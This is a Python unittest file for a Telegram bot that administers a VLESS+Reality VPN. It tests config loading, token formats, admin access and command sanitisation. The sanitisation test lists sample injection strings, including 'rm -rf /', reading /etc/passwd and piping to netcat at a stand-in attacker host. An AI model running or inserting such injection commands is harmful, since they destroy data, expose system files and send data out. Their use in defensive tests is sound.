#!/usr/bin/env python3
"""
VLESS+Reality VPN - Telegram Bot Integration Tests
Unit and integration tests for the Telegram bot
Version: 1.0
Author: VLESS Management System
"""

import unittest
import sys
import os
import tempfile
import sqlite3
from unittest.mock import Mock, patch, AsyncMock
import asyncio

# Add modules directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'modules'))

try:
    # Import bot modules (if available)
    from telegram_bot import VLESSBot
except ImportError as e:
    print(f"Warning: Could not import telegram_bot module: {e}")
    VLESSBot = None

class TestVLESSBot(unittest.TestCase):
    """Test cases for VLESSBot class"""

    def setUp(self):
        """Set up test environment"""
        if VLESSBot is None:
            self.skipTest("VLESSBot module not available")

        # Create temporary directories for testing
        self.temp_dir = tempfile.mkdtemp()
        self.config_dir = os.path.join(self.temp_dir, 'config')
        self.logs_dir = os.path.join(self.temp_dir, 'logs')
        os.makedirs(self.config_dir, exist_ok=True)
        os.makedirs(self.logs_dir, exist_ok=True)

        # Create test configuration file
        self.config_file = os.path.join(self.config_dir, 'bot_config.env')
        with open(self.config_file, 'w') as f:
            f.write("BOT_TOKEN=123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg\n")
            f.write("ADMIN_CHAT_ID=123456789\n")
            f.write("BOT_DEBUG=true\n")

        # Mock configuration paths
        self.original_config_dir = getattr(VLESSBot, 'CONFIG_DIR', None)
        self.original_log_dir = getattr(VLESSBot, 'LOG_DIR', None)

    def tearDown(self):
        """Clean up test environment"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_bot_initialization(self):
        """Test bot initialization"""
        if VLESSBot is None:
            self.skipTest("VLESSBot module not available")

        with patch('telegram_bot.BOT_CONFIG_FILE', self.config_file):
            try:
                bot = VLESSBot()
                self.assertIsNotNone(bot.config)
                self.assertEqual(bot.config['BOT_TOKEN'], '123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg')
                self.assertEqual(bot.config['ADMIN_CHAT_ID'], '123456789')
            except Exception as e:
                # If dependencies are missing, log and skip
                print(f"Bot initialization test skipped: {e}")
                self.skipTest(f"Dependencies not available: {e}")

    def test_config_loading(self):
        """Test configuration loading"""
        if VLESSBot is None:
            self.skipTest("VLESSBot module not available")

        with patch('telegram_bot.BOT_CONFIG_FILE', self.config_file):
            try:
                bot = VLESSBot()
                config = bot.load_config()
                self.assertIn('BOT_TOKEN', config)
                self.assertIn('ADMIN_CHAT_ID', config)
            except Exception as e:
                self.skipTest(f"Config loading test skipped: {e}")

    @patch('sqlite3.connect')
    def test_admin_database_initialization(self, mock_connect):
        """Test admin database initialization"""
        if VLESSBot is None:
            self.skipTest("VLESSBot module not available")

        mock_conn = Mock()
        mock_cursor = Mock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor

        with patch('telegram_bot.BOT_CONFIG_FILE', self.config_file):
            try:
                bot = VLESSBot()
                bot.init_admin_db()
                mock_cursor.execute.assert_called()
                mock_conn.commit.assert_called()
            except Exception as e:
                self.skipTest(f"Admin DB test skipped: {e}")

    def test_admin_management(self):
        """Test admin user management"""
        if VLESSBot is None:
            self.skipTest("VLESSBot module not available")

        with patch('telegram_bot.BOT_CONFIG_FILE', self.config_file):
            try:
                bot = VLESSBot()
                # Test adding admin
                result = bot.add_admin(123456789, "test_user", "system")
                # This might fail due to missing dependencies, which is OK
                print(f"Add admin result: {result}")
            except Exception as e:
                self.skipTest(f"Admin management test skipped: {e}")

class TestBotCommands(unittest.TestCase):
    """Test bot command handling"""

    def setUp(self):
        """Set up test environment for command testing"""
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        """Clean up test environment"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_command_validation(self):
        """Test command validation logic"""
        # Test basic command validation
        commands = ['/start', '/status', '/users', '/backup', '/help']
        for cmd in commands:
            self.assertTrue(cmd.startswith('/'))
            self.assertGreater(len(cmd), 1)

    def test_user_id_validation(self):
        """Test user ID validation"""
        valid_ids = ['123456789', '987654321']
        invalid_ids = ['abc', '12a34', '', 'not_a_number']

        for user_id in valid_ids:
            self.assertTrue(user_id.isdigit())

        for user_id in invalid_ids:
            self.assertFalse(user_id.isdigit())

class TestBotUtilities(unittest.TestCase):
    """Test bot utility functions"""

    def test_shell_command_validation(self):
        """Test shell command validation"""
        # Test safe commands
        safe_commands = [
            'systemctl status docker',
            'docker ps',
            'df -h',
            'free -h'
        ]

        for cmd in safe_commands:
            # Basic validation - no dangerous characters
            self.assertNotIn(';', cmd)
            self.assertNotIn('&&', cmd)
            self.assertNotIn('|', cmd)

    def test_qr_code_generation_logic(self):
        """Test QR code generation logic"""
        # Test QR code data validation
        test_data = "vless://test-uuid@example.com:443?type=tcp&security=reality#test"

        # Basic validation
        self.assertTrue(test_data.startswith('vless://'))
        self.assertIn('@', test_data)
        self.assertIn(':', test_data)

class TestConfigurationValidation(unittest.TestCase):
    """Test configuration validation"""

    def test_bot_token_format(self):
        """Test bot token format validation"""
        valid_tokens = [
            '123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg',
            '987654321:XYZ123abc456DEF789ghi012JKL345mno'
        ]

        invalid_tokens = [
            'invalid_token',
            '123456789',
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg',
            '123456789:',
            ':ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg'
        ]

        import re
        token_pattern = r'^[0-9]+:[A-Za-z0-9_-]+$'

        for token in valid_tokens:
            self.assertTrue(re.match(token_pattern, token))

        for token in invalid_tokens:
            self.assertFalse(re.match(token_pattern, token))

    def test_admin_chat_id_format(self):
        """Test admin chat ID format validation"""
        valid_ids = ['123456789', '987654321', '1']
        invalid_ids = ['abc123', '12.34', '-123', '']

        for chat_id in valid_ids:
            self.assertTrue(chat_id.isdigit() and int(chat_id) > 0)

        for chat_id in invalid_ids:
            try:
                result = chat_id.isdigit() and int(chat_id) > 0
                self.assertFalse(result)
            except ValueError:
                # Expected for non-numeric strings
                pass

class TestBotSecurity(unittest.TestCase):
    """Test bot security features"""

    def test_admin_access_control(self):
        """Test admin access control logic"""
        admin_list = {123456789, 987654321}

        # Test admin access
        self.assertTrue(123456789 in admin_list)
        self.assertTrue(987654321 in admin_list)

        # Test non-admin access
        self.assertFalse(555555555 in admin_list)
        self.assertFalse(0 in admin_list)

    def test_command_sanitization(self):
        """Test command input sanitization"""
        dangerous_inputs = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '| nc attacker.com 4444',
            '$(malicious_command)',
            '`harmful_script`'
        ]

        for dangerous_input in dangerous_inputs:
            # Check for dangerous characters
            has_dangerous_chars = any(char in dangerous_input for char in [';', '&', '|', '$', '`'])
            self.assertTrue(has_dangerous_chars, f"Should detect dangerous characters in: {dangerous_input}")

class TestBotIntegration(unittest.TestCase):
    """Test bot integration with system components"""

    def test_user_management_integration(self):
        """Test integration with user management system"""
        # Test that user management commands are properly formatted
        test_commands = [
            '/opt/vless/modules/user_management.sh list',
            '/opt/vless/modules/user_management.sh add testuser',
            '/opt/vless/modules/user_management.sh remove testuser'
        ]

        for cmd in test_commands:
            # Basic validation
            self.assertTrue(cmd.startswith('/opt/vless/modules/'))
            self.assertIn('user_management.sh', cmd)

    def test_backup_integration(self):
        """Test integration with backup system"""
        test_commands = [
            '/opt/vless/modules/backup_restore.sh status',
            '/opt/vless/modules/backup_restore.sh list',
            '/opt/vless/modules/backup_restore.sh full'
        ]

        for cmd in test_commands:
            self.assertTrue(cmd.startswith('/opt/vless/modules/'))
            self.assertIn('backup_restore.sh', cmd)

def run_tests():
    """Run all tests"""
    print("Running Telegram Bot Integration Tests...")
    print("=" * 50)

    # Create test suite
    suite = unittest.TestSuite()

    # Add test cases
    test_classes = [
        TestVLESSBot,
        TestBotCommands,
        TestBotUtilities,
        TestConfigurationValidation,
        TestBotSecurity,
        TestBotIntegration
    ]

    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        suite.addTests(tests)

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Print summary
    print("\n" + "=" * 50)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped) if hasattr(result, 'skipped') else 0}")

    if result.failures:
        print("\nFailures:")
        for test, failure in result.failures:
            print(f"  {test}: {failure}")

    if result.errors:
        print("\nErrors:")
        for test, error in result.errors:
            print(f"  {test}: {error}")

    return len(result.failures) == 0 and len(result.errors) == 0

if __name__ == '__main__':
    success = run_tests()
    sys.exit(0 if success else 1)